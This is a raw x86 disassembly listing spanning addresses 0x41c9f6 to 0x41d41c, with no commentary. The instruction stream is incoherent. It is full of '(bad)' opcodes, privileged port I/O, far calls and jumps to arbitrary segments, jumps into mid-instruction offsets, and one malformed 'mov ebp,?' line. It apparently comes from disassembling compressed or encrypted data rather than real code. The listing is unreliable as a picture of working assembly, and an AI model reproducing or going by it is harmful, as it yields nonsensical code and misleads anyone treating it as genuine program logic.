  41c9f6:	stos   DWORD PTR es:[edi],eax
  41c9f7:	mov    gs,WORD PTR [eax-0x2c]
  41c9fa:	fxch   st(4)
  41c9fc:	mov    edx,0xf6fe784
  41ca01:	jp     0x41c9fa
  41ca03:	pop    ds
  41ca04:	and    ch,ah
  41ca06:	xchg   DWORD PTR [ebx+0x12],ebx
  41ca09:	mov    gs,esi
  41ca0b:	push   ebx
  41ca0c:	add    DWORD PTR [eax+0x57],ecx
  41ca0f:	test   BYTE PTR [edi-0x48],dl
  41ca12:	retf   
  41ca13:	jle    0x41ca8b
  41ca15:	mov    bl,0x88
  41ca17:	jae    0x41c9c8
  41ca19:	mov    ebp,?
  41ca1b:	cdq    
  41ca1c:	pushf  
  41ca1d:	inc    edx
  41ca1e:	cmp    al,0x13
  41ca20:	loop   0x41ca49
  41ca22:	pop    edx
  41ca23:	xor    eax,0x6597fba
  41ca28:	jle    0x41c9d3
  41ca2a:	xchg   eax,edi
  41ca2c:	das    
  41ca2d:	test   eax,0xd86c1a92
  41ca32:	xor    BYTE PTR [eax-0x61],ch
  41ca35:	xchg   BYTE PTR [eax-0x6],bh
  41ca38:	jb     0x41ca55
  41ca3a:	out    dx,al
  41ca3b:	icebp  
  41ca3c:	les    edi,FWORD PTR [ebx+0x49e07809]
	...
  41cab2:	add    BYTE PTR [eax],al
  41cab4:	or     bh,BYTE PTR [eax-0x4048555b]
  41caba:	(bad)  
  41cabc:	sbb    eax,0x3ee2887e
  41cac1:	in     eax,dx
  41cac2:	sbb    dh,BYTE PTR [esi+0x1354e]
  41cac8:	test   BYTE PTR [eax],0x0
  41cacb:	add    BYTE PTR [ebx],dh
  41cacd:	mov    eax,ds:0x7a17f828
  41cad2:	or     eax,0x6ae3ad80
  41cad7:	(bad)  
  41cad8:	xor    ah,BYTE PTR [ecx-0x314698a8]
  41cade:	xor    eax,0xf2ef8199
  41cae3:	daa    
  41cae4:	mov    ds:0x447bf7da,eax
  41cae9:	cmp    BYTE PTR [ecx],bh
  41caeb:	or     eax,0xd88ebb
  41caf0:	cdq    
  41caf1:	test   eax,0xbb0cd549
  41caf6:	add    ecx,edi
  41caf8:	mov    al,ds:0xb7ec3ef0
  41cafd:	mov    esi,0xbd733a83
  41cb02:	pop    eax
  41cb03:	je     0x41cadf
  41cb05:	mov    DWORD PTR [eax+0x5e],edx
  41cb08:	je     0x41cb17
  41cb0a:	inc    esi
  41cb0b:	push   ecx
  41cb0c:	sub    eax,0x6bfce405
  41cb11:	adc    al,0xe0
  41cb13:	mov    ecx,0x48ee1456
  41cb18:	cmp    ebp,DWORD PTR [ecx+ecx*8+0x75]
  41cb1c:	add    eax,0xf62e456d
  41cb21:	cmp    bl,BYTE PTR [ecx]
  41cb23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb24:	fwait
  41cb25:	lods   al,BYTE PTR ds:[esi]
  41cb26:	inc    esp
  41cb27:	pop    ebx
  41cb28:	scas   al,BYTE PTR es:[edi]
  41cb29:	ja     0x41cac4
  41cb2b:	sub    al,dl
  41cb2d:	cmp    BYTE PTR [ebx-0x274772ef],ah
  41cb33:	ins    DWORD PTR es:[edi],dx
  41cb34:	or     BYTE PTR [edi+0x4ddb3cd0],bl
  41cb3a:	sbb    eax,0xf1fc845e
  41cb3f:	(bad)
  41cb43:	dec    ebx
  41cb44:	inc    esp
  41cb45:	lock sbb ebp,ebp
  41cb48:	add    BYTE PTR [eax],ah
  41cb4a:	mov    ebx,0x411aa140
  41cb4f:	cmp    ecx,DWORD PTR ds:0x60fb82fa
  41cb55:	push   edx
  41cb56:	jnp    0x41cb9e
  41cb58:	push   edx
  41cb59:	push   cs
  41cb5a:	lahf   
  41cb5b:	pop    edi
  41cb5c:	xor    BYTE PTR [eax+esi*4-0x6],0x8
  41cb61:	jg     0x41caf9
  41cb63:	ins    BYTE PTR es:[edi],dx
  41cb64:	into   
  41cb65:	in     eax,0x3d
  41cb67:	in     eax,0x55
  41cb69:	sub    dh,BYTE PTR [edx+0x39eccf0a]
  41cb6f:	xchg   esp,eax
  41cb70:	mov    cl,0xec
  41cb72:	ins    DWORD PTR es:[edi],dx
  41cb73:	ror    DWORD PTR [edx+ebx*2],0x81
  41cb77:	mov    dh,0x76
  41cb79:	clc    
  41cb7a:	add    esi,0xfffffff6
  41cb7d:	push   ebp
  41cb7e:	clc    
  41cb7f:	outs   dx,BYTE PTR ds:[esi]
  41cb80:	out    dx,al
  41cb81:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41cb83:	leave  
  41cb84:	xor    BYTE PTR [edx],dh
  41cb86:	inc    eax
  41cb87:	cmp    dl,BYTE PTR [edi+0x2a]
  41cb8a:	inc    edi
  41cb8b:	leave  
  41cb8c:	push   0xffffff8f
  41cb8e:	mov    eax,gs
  41cb90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb91:	sub    eax,0x3022b5b5
  41cb96:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41cb98:	xchg   esp,eax
  41cb99:	mov    ebx,0xa5d58e03
  41cb9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb9f:	or     al,0xd2
  41cba1:	aas    
  41cba2:	mov    ecx,0x5223834c
  41cba7:	aam    0x34
  41cba9:	sbb    BYTE PTR [eax+0x62],ah
  41cbac:	pop    ds
  41cbad:	jmp    0x41cbde
  41cbaf:	out    dx,al
  41cbb0:	mov    edx,DWORD PTR [eax]
  41cbb2:	pop    ss
  41cbb3:	jno    0x41cb9b
  41cbb5:	test   DWORD PTR [esi+eax*1+0x6bad6e77],eax
  41cbbc:	dec    ebp
  41cbbd:	shl    eax,cl
  41cbbf:	inc    esp
  41cbc0:	lods   eax,DWORD PTR ds:[esi]
  41cbc1:	cld    
	...
  41cc32:	add    BYTE PTR [eax],al
  41cc34:	shl    BYTE PTR [edx],cl
  41cc36:	cli    
  41cc37:	clc    
  41cc38:	cli    
  41cc39:	clc    
  41cc3a:	sar    BYTE PTR [edx],cl
  41cc3c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc3e:	inc    eax
  41cc3f:	aam    0x80
  41cc41:	scas   eax,DWORD PTR es:[edi]
  41cc42:	lock sub DWORD PTR [esi+esi*1+0x1],eax
  41cc47:	add    dh,dh
  41cc49:	add    BYTE PTR [eax],al
  41cc4b:	add    BYTE PTR [ebx+edx*1+0x2399fdfe],cl
  41cc52:	jecxz  0x41cc21
  41cc54:	arpl   sp,bx
  41cc56:	data16 adc BYTE PTR fs:[ecx-0x78],dh
  41cc5b:	sbb    al,0x83
  41cc5d:	stos   BYTE PTR es:[edi],al
  41cc5e:	mov    al,0x3c
  41cc60:	into   
  41cc61:	xchg   ecx,eax
  41cc62:	daa    
  41cc63:	das    
  41cc64:	out    0x4b,eax
  41cc66:	mov    BYTE PTR [edi-0x18],dl
  41cc69:	sbb    ecx,0xffffffc5
  41cc6c:	not    BYTE PTR [ebp-0xdb48992]
  41cc72:	pop    eax
  41cc73:	pusha  
  41cc74:	and    al,0x2c
  41cc76:	jle    0x41cc59
  41cc78:	pop    esi
  41cc79:	jbe    0x41cce8
  41cc7b:	loope  0x41cc8b
  41cc7d:	arpl   WORD PTR [edx+0x5bae89e1],ax
  41cc83:	out    dx,al
  41cc84:	scas   eax,DWORD PTR es:[edi]
  41cc85:	sub    al,0x62
  41cc87:	adc    dl,ah
  41cc89:	pop    ebx
  41cc8a:	adc    ebx,DWORD PTR [esi+eiz*4+0x5557e99f]
  41cc91:	jg     0x41cce7
  41cc93:	rol    BYTE PTR [esi+0x2c],cl
  41cc96:	push   es
  41cc97:	into   
  41cc98:	out    0xdf,eax
  41cc9a:	out    0x4b,eax
  41cc9c:	jle    0x41ccf6
  41cc9e:	sub    al,0x75
  41cca0:	cmp    eax,0x276a853
  41cca5:	mov    eax,ds:0x1847be71
  41ccaa:	mov    dh,0x78
  41ccac:	jno    0x41cd09
  41ccae:	adc    BYTE PTR [edi+eiz*1],0xc
  41ccb2:	adc    eax,0x437c49d4
  41ccb7:	pop    ebp
  41ccb8:	loop   0x41cd03
  41ccba:	(bad)
  41ccbd:	das    
  41ccbe:	xchg   dl,ah
  41ccc0:	aam    0x23
  41ccc2:	or     ch,BYTE PTR [edx]
  41ccc4:	sbb    DWORD PTR [ecx],edi
  41ccc6:	push   ecx
  41ccc7:	and    al,0x1e
  41ccc9:	mov    ah,0xe9
  41cccb:	and    eax,0x692577cf
  41ccd0:	mov    eax,0x8a305b98
  41ccd5:	mov    bh,0xa1
  41ccd7:	(bad)  
  41ccd8:	lock cdq 
  41ccda:	sti    
  41ccdb:	mov    eax,0xcfc0a720
  41cce0:	aas    
  41cce1:	inc    eax
  41cce2:	daa    
  41cce3:	ins    BYTE PTR es:[edi],dx
  41cce4:	mov    al,ds:0xbf8bc4f5
  41cce9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccea:	jp     0x41cc78
  41ccec:	cmp    DWORD PTR [eax+0x58f0071e],0x4e
  41ccf3:	xchg   BYTE PTR [edx-0x5a0ffb78],ah
  41ccf9:	add    dl,BYTE PTR [edi]
  41ccfb:	xchg   ecx,eax
  41ccfc:	add    BYTE PTR [edx-0x6a],ah
  41ccff:	leave  
  41cd00:	mov    ebx,0xa32f94f0
  41cd05:	(bad)  
  41cd07:	mov    cl,0x89
  41cd09:	es dec esp
  41cd0b:	cld    
  41cd0c:	and    DWORD PTR [ebp+0x2e],ebx
  41cd0f:	sub    BYTE PTR [ebx-0x183130eb],ch
  41cd15:	or     ecx,esp
  41cd17:	sbb    DWORD PTR [eax],0x6168c469
  41cd1d:	dec    esi
  41cd1e:	leave  
  41cd1f:	pushf  
  41cd20:	cmp    DWORD PTR [edi+ecx*8],esi
  41cd23:	jb     0x41cd69
  41cd25:	out    dx,eax
  41cd26:	or     esi,ebp
  41cd28:	cmp    eax,0xb39a1858
  41cd2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd2e:	mov    edx,0xa606b666
  41cd33:	ror    BYTE PTR cs:[esi],cl
  41cd36:	lock sub edx,DWORD PTR [ebx]
  41cd39:	jmp    0x41cd05
  41cd3b:	out    0x1a,eax
  41cd3d:	mov    eax,ds:0x68605e7e
	...
  41cdb2:	add    BYTE PTR [eax],al
  41cdb4:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41cdba:	imul   edi
  41cdbc:	push   ebp
  41cdbd:	call   0xf319:0x3e69b1bb
  41cdc4:	cmp    dh,BYTE PTR [edi]
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	test   BYTE PTR [eax],0x0
  41cdcb:	add    BYTE PTR [eax],bh
  41cdcd:	ja     0x41cdb9
  41cdcf:	push   0xffffffb8
  41cdd1:	jb     0x41cd8e
  41cdd3:	xchg   esp,eax
  41cdd4:	hlt    
  41cdd5:	xchg   ah,bh
  41cdd7:	sub    ch,0x36
  41cdda:	push   0xa60d9529
  41cddf:	jl     0x41ce25
  41cde1:	xchg   ebx,eax
  41cde2:	fcmovnbe st,st(0)
  41cde4:	leave  
  41cde5:	pop    ebp
  41cde6:	adc    BYTE PTR [eax-0x51],ah
  41cde9:	or     DWORD PTR [edi],ecx
  41cdeb:	jp     0x41ce36
  41cded:	add    esi,DWORD PTR [edx]
  41cdef:	cdq    
  41cdf0:	fiadd  DWORD PTR [edi]
  41cdf2:	adc    BYTE PTR [edi],ch
  41cdf4:	xchg   esi,eax
  41cdf5:	mov    edi,0x7e9810ab
  41cdfa:	ins    DWORD PTR es:[edi],dx
  41cdfb:	dec    edi
  41cdfc:	push   ecx
  41cdfd:	sahf   
  41cdfe:	daa    
  41cdff:	ja     0x41cdc5
  41ce01:	dec    ebp
  41ce02:	scas   al,BYTE PTR es:[edi]
  41ce03:	mov    eax,es
  41ce05:	dec    ecx
  41ce06:	adc    al,0x8b
  41ce08:	sub    DWORD PTR [ebx],ecx
  41ce0a:	repnz out 0x3a,eax
  41ce0d:	scas   eax,DWORD PTR es:[edi]
  41ce0e:	outs   dx,DWORD PTR ds:[esi]
  41ce0f:	div    BYTE PTR [edi-0x7ed08620]
  41ce15:	mov    dl,0x51
  41ce17:	jmp    0x88f1:0xb0b4a564
  41ce1e:	lea    ebp,[ebx+0x352d8a1a]
  41ce24:	call   0x6cf1:0xdadbd754
  41ce2b:	mov    ebx,0xf680a4f
  41ce30:	out    dx,al
  41ce31:	push   esi
  41ce32:	xor    esp,DWORD PTR [eax]
  41ce34:	std    
  41ce35:	shr    DWORD PTR [edi+ebx*8+0x39],1
  41ce39:	enter  0xc75a,0x2b
  41ce3d:	adc    DWORD PTR [edi+0x17],esp
  41ce40:	jno    0x41ce32
  41ce42:	inc    edx
  41ce43:	add    DWORD PTR [eax+0x51971f98],ecx
  41ce49:	pop    ds
  41ce4a:	lods   eax,DWORD PTR ds:[esi]
  41ce4b:	dec    ecx
  41ce4c:	jae    0x41ce67
  41ce4e:	dec    esp
  41ce4f:	sub    DWORD PTR [ecx+0x69],0x60e8a822
  41ce56:	mov    cl,0xf2
  41ce58:	outs   dx,BYTE PTR ds:[esi]
  41ce59:	fdivr  st,st(2)
  41ce5b:	mov    ebx,0xe3fd2130
  41ce60:	cld    
  41ce61:	out    0x80,eax
  41ce63:	mov    al,0x29
  41ce65:	fnstsw WORD PTR [eax-0x221fa041]
  41ce6b:	in     al,dx
  41ce6c:	jl     0x41cdf3
  41ce6e:	or     BYTE PTR [ebp+0x76],0x39
  41ce72:	mov    ah,0x47
  41ce74:	in     eax,dx
  41ce75:	push   esi
  41ce76:	jae    0x41cef2
  41ce78:	and    cl,ch
  41ce7a:	sti    
  41ce7b:	adc    DWORD PTR [ebx+0x62],0x2a
  41ce7f:	and    BYTE PTR [esi-0x53cbf5af],cl
  41ce85:	sub    BYTE PTR [eax+0x27],dh
  41ce88:	sbb    DWORD PTR [edi-0x40f6fcbd],esp
  41ce8e:	xor    BYTE PTR [ebp+0x71],0x3c
  41ce92:	mov    bh,0x6b
  41ce94:	push   ebp
  41ce95:	jns    0x41ce6c
  41ce97:	mov    bh,0x6b
  41ce99:	jbe    0x41ced7
  41ce9b:	lahf   
  41ce9c:	shl    ecx,0xd4
  41ce9f:	or     eax,ebp
  41cea1:	enter  0x8da9,0xfb
  41cea5:	out    0xa7,eax
  41cea7:	xchg   esp,eax
  41cea8:	mov    al,ds:0x68eec74d
  41cead:	cs in  al,0x91
  41ceb0:	out    0xf7,eax
  41ceb2:	ror    BYTE PTR [eax+0xc847dba],cl
  41ceb8:	xlat   BYTE PTR ds:[ebx]
  41ceb9:	fs dec esp
  41cebb:	dec    eax
  41cebc:	fnstcw WORD PTR [edx-0x5461ba06]
	...
  41cf32:	add    BYTE PTR [eax],al
  41cf34:	fs jae 0x41cf6a
  41cf37:	es aaa 
  41cf39:	data16 jne 0x41cfaf
  41cf3c:	cmc    
  41cf3d:	jle    0x41cf41
  41cf3f:	dec    esi
  41cf40:	push   edx
  41cf41:	mov    edi,0x38301eac
  41cf46:	add    DWORD PTR [eax],eax
  41cf48:	test   BYTE PTR [eax],0x0
  41cf4b:	add    BYTE PTR [esi-0x34b9786e],bh
  41cf51:	iret   
  41cf52:	aam    0x2e
  41cf54:	adc    BYTE PTR [edi],ch
  41cf56:	add    eax,0x26dfdd9d
  41cf5b:	mov    dh,0x80
  41cf5d:	mov    esp,0x6f9fd75a
  41cf62:	int    0x24
  41cf64:	sbb    al,0xa0
  41cf66:	out    dx,eax
  41cf67:	(bad)  
  41cf68:	xor    al,0xe9
  41cf6a:	ja     0x41cef1
  41cf6c:	pop    ebp
  41cf6d:	sti    
  41cf6e:	jo     0x41cf81
  41cf70:	stc    
  41cf71:	lock js 0x41cf21
  41cf74:	repz mov eax,0xa4e4999
  41cf7a:	add    eax,0xcb91e530
  41cf7f:	arpl   WORD PTR [esi+0x7c],dx
  41cf82:	shl    DWORD PTR [ebx],1
  41cf84:	mov    ds:0xda13f590,al
  41cf89:	add    BYTE PTR ds:0xbb1decb8,0x87
  41cf90:	int3   
  41cf91:	mov    dh,0xc7
  41cf93:	retf   0x7cc0
  41cf96:	push   edi
  41cf97:	fs inc edx
  41cf99:	jb     0x41cf8e
  41cf9b:	sub    esp,ebx
  41cf9d:	mov    edi,DWORD PTR [esi]
  41cf9f:	or     dh,BYTE PTR [esi+edx*1]
  41cfa2:	xchg   ebx,eax
  41cfa3:	dec    ebx
  41cfa4:	pop    esi
  41cfa5:	lfs    ebx,FWORD PTR [esi-0x4e]
  41cfa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfaa:	(bad)  [esi]
  41cfac:	jne    0x41cff3
  41cfae:	push   ebx
  41cfaf:	push   0xffffffe9
  41cfb1:	pop    eax
  41cfb2:	push   ebp
  41cfb3:	xchg   edx,eax
  41cfb4:	xchg   BYTE PTR [ecx-0x4e],ah
  41cfb7:	jnp    0x41cf50
  41cfb9:	push   ebx
  41cfba:	int3   
  41cfbb:	jbe    0x41d03a
  41cfbd:	pop    edx
  41cfbe:	fidivr WORD PTR [edi]
  41cfc0:	pop    ss
  41cfc1:	ja     0x41cfa1
  41cfc3:	cld    
  41cfc4:	mov    ch,0x37
  41cfc6:	jo     0x41cf50
  41cfc8:	hlt    
  41cfc9:	cli    
  41cfca:	and    eax,0xbac86008
  41cfcf:	aam    0xd8
  41cfd1:	xchg   edi,eax
  41cfd2:	mov    dh,0xd3
  41cfd4:	jecxz  0x41cf7e
  41cfd6:	sbb    eax,0x5b648747
  41cfdb:	or     eax,0xe6cb2311
  41cfe0:	jmp    0x41d043
  41cfe2:	pop    es
  41cfe3:	pop    ebp
  41cfe4:	out    dx,eax
  41cfe5:	hlt    
  41cfe6:	paddw  mm6,mm1
  41cfe9:	shr    BYTE PTR [esp+ecx*4+0x43],0x6
  41cfee:	sti    
  41cfef:	mov    WORD PTR [edx],ds
  41cff1:	leave  
  41cff2:	mov    cl,0x57
  41cff4:	fdivp  st(4),st
  41cff6:	fsub   DWORD PTR [ebp-0x12]
  41cff9:	add    al,0xec
  41cffb:	xlat   BYTE PTR ds:[ebx]
  41cffc:	cs jecxz 0x41d03d
  41cfff:	xor    esp,eax
  41d001:	mov    dh,0x8a
  41d003:	mov    al,ds:0x47b209b5
  41d008:	sub    al,0xb8
  41d00a:	cmp    eax,0x7bfe0198
  41d00f:	mov    cs,esi
  41d011:	out    0x4a,al
  41d013:	mov    ebx,0x311a7c88
  41d018:	mov    ecx,DWORD PTR [ebx+esi*8-0x5d]
  41d01c:	push   ebp
  41d01d:	shl    BYTE PTR [edi+edx*8+0x45d88a4d],0x77
  41d025:	clc    
  41d026:	pop    eax
  41d027:	xchg   edi,eax
  41d028:	outs   dx,BYTE PTR ds:[esi]
  41d029:	or     eax,0x3db5edfe
  41d02e:	xchg   edx,eax
  41d02f:	add    eax,DWORD PTR [ecx-0x7b8786be]
  41d035:	adc    dl,BYTE PTR [ecx-0x50]
  41d038:	cmp    eax,0x737fb97c
  41d03d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d03e:	cwde   
  41d03f:	mov    al,0xc8
  41d041:	int3   
	...
  41d0b2:	add    BYTE PTR [eax],al
  41d0b4:	(bad)  [edx-0x5f]
  41d0b7:	clc    
  41d0b8:	mov    bl,0xfb
  41d0ba:	fldcw  WORD PTR [ebx-0x56]
  41d0bd:	cwde   
  41d0be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0bf:	xor    BYTE PTR [edx+ebx*1+0x3926a0be],0x1
  41d0c7:	add    dh,dh
  41d0c9:	add    BYTE PTR [eax],al
  41d0cb:	add    BYTE PTR [ecx+0x2e],dh
  41d0ce:	push   ss
  41d0cf:	fild   QWORD PTR ds:0xb460a92b
  41d0d5:	hlt    
  41d0d6:	add    ecx,DWORD PTR [ebx-0x9]
  41d0d9:	pop    es
  41d0da:	fsub   QWORD PTR [ebp-0x18]
  41d0dd:	bound  ebx,QWORD PTR [ebx+0x65]
  41d0e0:	jg     0x41d0e7
  41d0e2:	cld    
  41d0e3:	xchg   edi,eax
  41d0e4:	(bad)  
  41d0e5:	pushf  
  41d0e6:	stc    
  41d0e7:	enter  0x95d6,0x9b
  41d0eb:	lods   eax,DWORD PTR ds:[esi]
  41d0ec:	stc    
  41d0ed:	mov    WORD PTR [eax-0x288421e7],ds
  41d0f3:	jae    0x41d0fd
  41d0f5:	add    DWORD PTR [edi-0x2f08dbd8],eax
  41d0fb:	stc    
  41d0fc:	pop    DWORD PTR [eax]
  41d0fe:	mov    bh,BYTE PTR ss:[ebx-0x42444d53]
  41d105:	inc    esp
  41d106:	aas    
  41d107:	and    ebp,DWORD PTR [eax-0x69]
  41d10a:	sub    edx,ebp
  41d10c:	pop    ecx
  41d10d:	push   edx
  41d10e:	mov    dh,0x32
  41d110:	test   DWORD PTR [ebx+0x79],0x5a7b52d7
  41d117:	jecxz  0x41d131
  41d119:	pop    edx
  41d11a:	ss mov cl,0x6e
  41d11d:	sbb    BYTE PTR [edx-0x1c3c1f58],bh
  41d123:	adc    ebp,ecx
  41d125:	jg     0x41d18d
  41d127:	inc    ebp
  41d128:	fcom   QWORD PTR [esi-0x77]
  41d12b:	jle    0x41d0ed
  41d12d:	push   ss
  41d12e:	and    bh,BYTE PTR [ebp-0xed8271a]
  41d134:	mov    eax,ds:0x3ab81e5b
  41d139:	xchg   esi,eax
  41d13a:	pop    edi
  41d13b:	test   al,0xf8
  41d13d:	out    0xa3,eax
  41d13f:	mov    ebx,0x5344f62
  41d144:	pop    esi
  41d145:	sub    dl,cl
  41d147:	jns    0x41d15a
  41d149:	push   ss
  41d14a:	mov    dl,0xcd
  41d14c:	pop    es
  41d14d:	mov    ch,dh
  41d14f:	dec    ebp
  41d150:	(bad)  
  41d151:	leave  
  41d152:	jnp    0x41d0f4
  41d154:	dec    edx
  41d155:	pusha  
  41d156:	in     al,0x5f
  41d158:	xor    ah,BYTE PTR [esi]
  41d15a:	or     esp,ecx
  41d15c:	xchg   esi,eax
  41d15d:	scas   al,BYTE PTR es:[edi]
  41d15e:	pop    esp
  41d15f:	jge    0x41d176
  41d161:	mov    ecx,0x55a77abb
  41d166:	aas    
  41d167:	xchg   edi,eax
  41d168:	repz cld 
  41d16a:	or     edi,DWORD PTR [edi+0x46]
  41d16d:	(bad)  
  41d16e:	xchg   ecx,eax
  41d16f:	cwde   
  41d170:	inc    edx
  41d171:	shl    ebp,cl
  41d173:	(bad)  
  41d174:	adc    eax,DWORD PTR [esp+eax*2+0x3fe449d6]
  41d17b:	jmp    0x571cb6cd
  41d180:	inc    esp
  41d181:	add    al,0xbe
  41d183:	cmp    BYTE PTR [esi+edi*8+0x21508a9d],dh
  41d18a:	mov    BYTE PTR ds:0xab949167,0x4a
  41d191:	test   ch,al
  41d193:	bound  edx,QWORD PTR [ebx-0x436f6e89]
  41d199:	lock mov dh,0x85
  41d19c:	test   al,0x89
  41d19e:	adc    DWORD PTR [esi+0xc],ebp
  41d1a1:	xor    edx,DWORD PTR [eax+0x3a8973d9]
  41d1a7:	jae    0x41d18d
  41d1a9:	inc    edx
  41d1aa:	into   
  41d1ab:	mov    esp,esp
  41d1ad:	pop    ss
  41d1ae:	in     eax,dx
  41d1af:	xor    al,0x13
  41d1b1:	jno    0x41d1e7
  41d1b3:	sbb    edx,DWORD PTR ds:0x8aa40282
  41d1b9:	push   ss
  41d1ba:	inc    edx
  41d1bb:	xchg   esp,eax
  41d1bc:	dec    edi
  41d1bd:	jecxz  0x41d18f
  41d1bf:	ret    
  41d1c0:	lods   eax,DWORD PTR ds:[esi]
  41d1c1:	jge    0x41d1c3
	...
  41d233:	add    bl,dh
  41d235:	and    ebp,ecx
  41d237:	push   ebp
  41d238:	(bad)  
  41d23a:	sti    
  41d23b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d23c:	pop    edi
  41d23d:	push   edx
  41d23e:	jo     0x41d1ff
  41d240:	xchg   ebp,eax
  41d241:	xchg   DWORD PTR [esp+eax*2+0x1c],esp
  41d245:	cmp    al,BYTE PTR [ecx]
  41d247:	add    dh,dh
  41d249:	add    BYTE PTR [eax],al
  41d24b:	add    dh,ch
  41d24d:	loopne 0x41d268
  41d24f:	and    DWORD PTR [edx],eax
  41d251:	dec    eax
  41d252:	aaa    
  41d253:	mov    bl,0x63
  41d255:	out    0x1e,eax
  41d257:	shr    DWORD PTR [ebx-0x642bd1f2],1
  41d25d:	cld    
  41d25e:	dec    edx
  41d25f:	fs (bad) 
  41d261:	sub    eax,0xc086e5ef
  41d266:	push   0x1b
  41d268:	test   al,0xc7
  41d26a:	inc    eax
  41d26b:	mov    ah,dh
  41d26d:	cli    
  41d26e:	std    
  41d26f:	xor    al,BYTE PTR [eax+0x1e]
  41d272:	repz xchg esp,eax
  41d274:	adc    al,0x13
  41d276:	mov    esi,DWORD PTR [ebx+0x2be6aec8]
  41d27c:	or     esp,esi
  41d27e:	in     eax,dx
  41d27f:	hlt    
  41d280:	pushf  
  41d281:	icebp  
  41d282:	ficom  WORD PTR [esi]
  41d284:	push   edx
  41d285:	add    eax,0xeaaaf873
  41d28a:	sub    al,0x48
  41d28c:	fdivr  st(5),st
  41d28e:	hlt    
  41d28f:	mov    al,ds:0xb1462473
  41d294:	xchg   ebp,eax
  41d295:	jmp    0x4292:0x5f716b30
  41d29c:	hlt    
  41d29d:	push   ebp
  41d29e:	push   cs
  41d29f:	or     edx,DWORD PTR [eax+0x40]
  41d2a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2a3:	and    eax,0x26ab9bb6
  41d2a8:	sar    BYTE PTR [edx],1
  41d2aa:	and    eax,DWORD PTR [esp+ebx*4]
  41d2ad:	push   ecx
  41d2ae:	int3   
  41d2af:	push   esi
  41d2b0:	imul   ecx,DWORD PTR [eax+0x159dbba0],0xffffffaf
  41d2b7:	dec    eax
  41d2b8:	xchg   ebx,eax
  41d2b9:	pop    esp
  41d2ba:	test   BYTE PTR [ebp+0x7],0x2b
  41d2be:	fwait
  41d2bf:	sub    eax,0xf8d7e3d7
  41d2c4:	(bad)  
  41d2c5:	jp     0x41d32e
  41d2c7:	mov    esi,0x74172edb
  41d2cc:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41d2ce:	push   0xa86c8240
  41d2d3:	cmc    
  41d2d4:	jmp    0x28c59bf6
  41d2d9:	cmc    
  41d2da:	ja     0x41d2b4
  41d2dc:	add    esi,esi
  41d2de:	outs   dx,DWORD PTR ds:[esi]
  41d2df:	mov    eax,ds:0x865cd3e9
  41d2e4:	mov    al,0x0
  41d2e6:	scas   eax,DWORD PTR es:[edi]
  41d2e7:	lea    ebx,[ebx]
  41d2e9:	sahf   
  41d2ea:	and    ah,BYTE PTR [esi+esi*8]
  41d2ed:	test   al,0xab
  41d2ef:	call   0x22cedc53
  41d2f4:	in     eax,0xfe
  41d2f6:	xchg   BYTE PTR gs:[ebp+0x674db5e1],al
  41d2fd:	stos   BYTE PTR es:[edi],al
  41d2fe:	xchg   DWORD PTR [edi-0x34b2675],esp
  41d304:	jb     0x41d33e
  41d306:	or     DWORD PTR [edx-0x6f],edi
  41d309:	scas   al,BYTE PTR es:[edi]
  41d30a:	sti    
  41d30b:	dec    esp
  41d30c:	add    DWORD PTR [edx+0x17],ecx
  41d30f:	sbb    bl,bh
  41d311:	ret    
  41d312:	adc    BYTE PTR [esi-0x63],0xe5
  41d316:	sbb    ebp,esi
  41d318:	mov    esp,0xb970099c
  41d31d:	mov    ecx,DWORD PTR [ebx]
  41d31f:	call   0x9f7:0x74a78a07
  41d326:	adc    BYTE PTR [edi+edi*8+0x14e03666],0x46
  41d32e:	sub    al,0xb4
  41d330:	out    0xc9,eax
  41d332:	dec    esp
  41d333:	adc    al,0xfd
  41d335:	les    esi,FWORD PTR [ecx]
  41d337:	fbld   TBYTE PTR [ebx]
  41d339:	shl    BYTE PTR [ebp+0x6f772f3b],0x89
  41d340:	sub    eax,0x8b
	...
  41d3b1:	add    BYTE PTR [eax],al
  41d3b3:	add    BYTE PTR [ebx+0x20],dl
  41d3b6:	mov    al,ds:0x5faef3ae
  41d3bb:	std    
  41d3bc:	cmp    eax,0x4c
  41d3bf:	(bad)  
  41d3c0:	pop    ss
  41d3c1:	add    eax,0x3b12a9d2
  41d3c6:	add    DWORD PTR [eax],eax
  41d3c8:	test   BYTE PTR [eax],0x0
  41d3cb:	add    BYTE PTR [edi+0x71],dl
  41d3ce:	(bad)  
  41d3cf:	cli    
  41d3d0:	mov    DWORD PTR [edi-0x6c],0xb5c7d254
  41d3d7:	jle    0x41d43d
  41d3d9:	and    eax,0x70836a01
  41d3de:	fwait
  41d3df:	adc    al,0x2d
  41d3e1:	daa    
  41d3e2:	fwait
  41d3e3:	push   ds
  41d3e4:	dec    edx
  41d3e5:	mov    ebx,0xe4515a4e
  41d3ea:	cwde   
  41d3eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3ec:	neg    BYTE PTR [eax+0x60]
  41d3ef:	adc    esp,esp
  41d3f1:	xchg   edi,eax
  41d3f2:	sub    al,0xd8
  41d3f4:	adc    eax,0x264cb96c
  41d3f9:	(bad)  
  41d3fa:	lock sub al,0xee
  41d3fd:	cld    
  41d3fe:	adc    DWORD PTR [edi-0x3a323cb0],0x67
  41d405:	dec    edx
  41d406:	add    dl,cl
  41d408:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d409:	or     ebp,eax
  41d40b:	push   ds
  41d40c:	shl    DWORD PTR [ecx-0x31],1
  41d40f:	mov    esi,0xe7bbd6c9
  41d414:	jo     0x41d436
  41d416:	fistp  DWORD PTR [edx+0x47abda61]
  41d41c:	dec    eax
